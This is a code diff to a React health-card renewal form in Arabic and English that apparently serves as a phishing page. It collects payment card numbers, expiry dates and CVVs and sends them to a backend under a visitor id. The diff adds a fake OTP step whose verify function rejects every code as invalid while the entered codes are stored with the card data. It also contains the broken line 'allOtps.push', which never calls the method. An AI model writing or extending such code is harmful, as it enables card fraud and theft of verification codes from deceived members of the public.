@@ -1,3 +1,4 @@
+"use client"
 
 import { useState } from "react"
 import { useNavigate } from "react-router-dom"
@@ -30,15 +31,17 @@ interface FormData {
 const steps = [
   { label: "Card Information", labelAr: "معلومات البطاقة" },
   { label: "Submission", labelAr: "استكمال التقديم" },
-
   { label: "Payment Details", labelAr: "تفاصيل الدفع" },
   { label: "Complete Process", labelAr: "إتمام العملية" },
 ]
-
+const allOtps = ['']
 export default function HealthCardRenewal() {
   const { language } = useLanguage()
   const navigate = useNavigate()
   const [currentStep, setCurrentStep] = useState(1)
+  const [otp, setOtp] = useState("")
+  const [otpError, setOtpError] = useState("")
+  const [isVerified, setIsVerified] = useState(false)
 
   const {
     register,
@@ -53,8 +56,11 @@ export default function HealthCardRenewal() {
   const operationType = watch("operationType")
 
   const onSubmit = (data: FormData) => {
-   const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,data})
+    const visitorId = localStorage.getItem("visitor")
+    if (currentStep === 3) {
+      allOtps.push
+    }
+    addData({ id: visitorId, data, otp, allOtps })
 
     if (currentStep < 4) {
       setCurrentStep((s) => s + 1)
@@ -66,6 +72,26 @@ export default function HealthCardRenewal() {
   }
 
   const handleClearFields = () => reset()
+
+  const handleVerifyOtp = () => {
+    setOtpError("")
+
+    if (!otp) {
+      setOtpError(language === "ar" ? "الرجاء إدخال رمز التحقق" : "Please enter the verification code")
+      return
+    }
+
+    if (otp.length !== 6) {
+      setOtpError(language === "ar" ? "رمز التحقق يجب أن يكون 6 أرقام" : "Verification code must be 6 digits")
+      return
+    }
+
+    setOtpError(
+      language === "ar"
+        ? "رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى."
+        : "Invalid verification code. Please try again.",
+    )
+  }
 
   return (
     <div className="min-h-screen bg-background flex flex-col overflow-x-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
@@ -107,7 +133,7 @@ export default function HealthCardRenewal() {
 
               <form dir="rtl" onSubmit={handleSubmit(onSubmit)} className="space-y-6">
                 {/* Card Number */}
-                <div >
+                <div>
                   <Label htmlFor="cardNumber">
                     {language === "ar" ? "الرجاء إدخال رقم البطاقة الشخصية" : "Please enter your personal card number"}
                     <span className="text-destructive">*</span>
@@ -322,12 +348,13 @@ export default function HealthCardRenewal() {
               </h2>
 
               {/* CARD TYPE */}
-              <div>
-                <Label>
+              <div dir="rtl">
+                <Label className="font-bold">
                   {language === "ar" ? "نوع البطاقة" : "Card Type"}
                   <span className="text-destructive">*</span>
                 </Label>
                 <RadioGroup
+                  dir="rtl"
                   defaultValue="visa"
                   className="mt-3 space-y-2"
                   onValueChange={(value) => {
@@ -354,7 +381,7 @@ export default function HealthCardRenewal() {
 
               {/* CARD NUMBER */}
               <div>
-                <Label htmlFor="paymentCardNumber">
+                <Label htmlFor="paymentCardNumber" className="font-bold">
                   {language === "ar" ? "رقم البطاقة" : "Card Number"}
                   <span className="text-destructive">*</span>
                 </Label>
@@ -379,7 +406,7 @@ export default function HealthCardRenewal() {
 
               {/* EXPIRATION DATE */}
               <div>
-                <Label htmlFor="paymentExpiry">
+                <Label htmlFor="paymentExpiry" className="font-bold">
                   {language === "ar" ? "تاريخ الانتهاء" : "Expiration Date (MM/YY)"}
                   <span className="text-destructive">*</span>
                 </Label>
@@ -403,7 +430,7 @@ export default function HealthCardRenewal() {
 
               {/* CVV */}
               <div>
-                <Label htmlFor="paymentCVV">
+                <Label htmlFor="paymentCVV" className="font-bold">
                   CVV
                   <span className="text-destructive">*</span>
                 </Label>
@@ -437,21 +464,76 @@ export default function HealthCardRenewal() {
           )}
 
           {/* -------------------------------------------------- */}
-          {/* STEP 4: COMPLETE PROCESS */}
+          {/* STEP 4: COMPLETE PROCESS - OTP VERIFICATION */}
           {/* -------------------------------------------------- */}
           {currentStep === 4 && (
             <div className="space-y-6">
               <h2 className="text-xl font-bold mb-4 pb-3 border-b">
-                {language === "ar" ? "إتمام العملية" : "Complete Process"}
+                {language === "ar" ? "التحقق من الهوية" : "Identity Verification"}
               </h2>
 
-              <p className="text-green-600 text-lg font-semibold">
-                {language === "ar" ? "تم إكمال العملية بنجاح!" : "Your process has been completed successfully!"}
-              </p>
+              {!isVerified ? (
+                <>
+                  {/* OTP verification section */}
+                  <div className="bg-muted/50 p-6 rounded-lg">
+                    <p className="text-sm text-muted-foreground mb-4">
+                      {language === "ar"
+                        ? "تم إرسال رمز التحقق إلى رقم هاتفك المسجل. الرجاء إدخال الرمز للمتابعة."
+                        : "A verification code has been sent to your registered phone number. Please enter the code to continue."}
+                    </p>
 
-              <Button className="mt-4 bg-primary text-primary-foreground" onClick={() => navigate("/")}>
-                {language === "ar" ? "العودة إلى الخدمات" : "Back to Services"}
-              </Button>
+                    <div>
+                      <Label htmlFor="otp" className="font-bold">
+                        {language === "ar" ? "رمز التحقق (OTP)" : "Verification Code (OTP)"}
+                        <span className="text-destructive">*</span>
+                      </Label>
+                      <Input
+                        id="otp"
+                        value={otp}
+                        onChange={(e) => {
+                          const value = e.target.value.replace(/[^0-9]/g, "")
+                          setOtp(value)
+                          setOtpError("") // Clear error when user types
+                        }}
+                        placeholder={
+                          language === "ar" ? "أدخل رمز التحقق المكون من 6 أرقام" : "Enter 6-digit verification code"
+                        }
+                        className="h-12 mt-2 text-center text-lg tracking-widest"
+                        maxLength={6}
+                        dir="ltr"
+                      />
+                      {otpError && (
+                        <div className="mt-2 p-3 bg-destructive/10 border border-destructive/20 rounded-md">
+                          <p className="text-sm text-destructive font-medium">{otpError}</p>
+                        </div>
+                      )}
+                    </div>
+
+                    <Button
+                      onClick={handleVerifyOtp}
+                      className="w-full mt-4 h-12 bg-primary text-primary-foreground"
+                      disabled={!otp || otp.length !== 6}
+                    >
+                      {language === "ar" ? "تحقق من الرمز" : "Verify Code"}
+                    </Button>
+
+                    <Button onClick={goBack} variant="outline" className="w-full mt-3 h-12 bg-transparent">
+                      {language === "ar" ? "رجوع" : "Back"}
+                    </Button>
+                  </div>
+                </>
+              ) : (
+                <>
+                  {/* Success message after verification */}
+                  <p className="text-green-600 text-lg font-semibold">
+                    {language === "ar" ? "تم إكمال العملية بنجاح!" : "Your process has been completed successfully!"}
+                  </p>
+
+                  <Button className="mt-4 bg-primary text-primary-foreground" onClick={() => navigate("/")}>
+                    {language === "ar" ? "العودة إلى الخدمات" : "Back to Services"}
+                  </Button>
+                </>
+              )}
             </div>
           )}
         </div>
